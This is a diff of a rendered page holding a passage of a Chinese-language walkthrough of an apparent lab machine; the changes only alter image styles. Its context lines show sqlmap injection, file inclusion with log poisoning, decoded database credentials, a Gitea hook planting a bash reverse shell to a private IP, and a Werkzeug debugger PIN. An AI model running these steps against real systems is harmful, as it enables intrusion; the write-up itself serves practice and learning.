@@ -326,7 +326,7 @@ document.addEventListener(<span class="pl-s"><span class="pl-pds">"</span>DOMCon
 })<span class="pl-k">;</span>
 </pre></div>
 <p>意思是它user_agent可以以json传点东西，开个burp试试</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564"><img src="https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564"><img src="https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564" alt="Image" style="max-width: 100%;"></a></p>
 <p>sql注一下看有没有东西</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
 └─$ sqlmap -r sql.txt --batch
@@ -432,20 +432,20 @@ Database: logan
 <span class="pl-s">+------------------------------+--------+</span>
 <span class="pl-s"></span></pre></div>
 <p>只有一个用户名和域名，我们将域名加上</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2"><img src="https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2"><img src="https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2" alt="Image" style="max-width: 100%;"></a></p>
 <p>试试有没有文件包含</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea"><img src="https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea"><img src="https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea" alt="Image" style="max-width: 100%;"></a></p>
 <p>存在文件包含，尝试读取密钥，无果。看看存不存在日志注入</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee"><img src="https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee"><img src="https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee" alt="Image" style="max-width: 100%;"></a></p>
 <p>存在，尝试注入</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b"><img src="https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b"><img src="https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b" alt="Image" style="max-width: 100%;"></a></p>
 <p>嘻嘻</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c"><img src="https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c"><img src="https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c" alt="Image" style="max-width: 100%;"></a></p>
 <p>不嘻嘻，容易的都给它禁了</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7"><img src="https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7"><img src="https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7" alt="Image" style="max-width: 100%;"></a></p>
 <p>还一分钟清一次，考验手速是吧？</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a"><img src="https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a" alt="Image" style="max-width: 100%; height: auto;"></a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd"><img src="https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a"><img src="https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a" alt="Image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd"><img src="https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd" alt="Image" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>PD9waHAKCQoJJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKCSR1c2VybmFtZSA9ICJsb2dhbiI7CgkkcGFzc3dvcmQgPSAiU3VwZXJfbG9nYW4xMjM0IjsKCSRkYm5hbWUgPSAibG9nYW4iOwoKCS8vIENyZWF0ZSBjb25uZWN0aW9uCgkkY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKCS8vIENoZWNrIGNvbm5lY3Rpb24KCWlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewoJICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwoJfQoKPz4K<span class="pl-pds">'</span></span> <span class="pl-k">|</span>base64 -d
 <span class="pl-k">&lt;</span><span class="pl-k">?</span>php
@@ -465,13 +465,13 @@ Database: logan
 <span class="pl-k">?</span><span class="pl-k">&gt;</span>
 </pre></div>
 <p>登录Gitea</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c"><img src="https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c"><img src="https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c" alt="Image" style="max-width: 100%;"></a></p>
 <p>改个shell上去</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#!</span>/bin/sh</span>
 bash -c <span class="pl-s"><span class="pl-pds">"</span>bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1<span class="pl-pds">"</span></span>
 省略</pre></div>
 <p>交个文件上去</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a"><img src="https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a"><img src="https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a" alt="Image" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888
 listening on [any] 8888 ...
@@ -572,7 +572,7 @@ Press CTRL+C to quit
  <span class="pl-k">*</span> Debugger PIN: 632-008-714
 </pre></div>
 <p>熟悉的配方，那就简单了（PIN都给了Debugger PIN: 632-008-714）</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9"><img src="https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9"><img src="https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9" alt="Image" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8889                                  
 listening on [any] 8889 ...
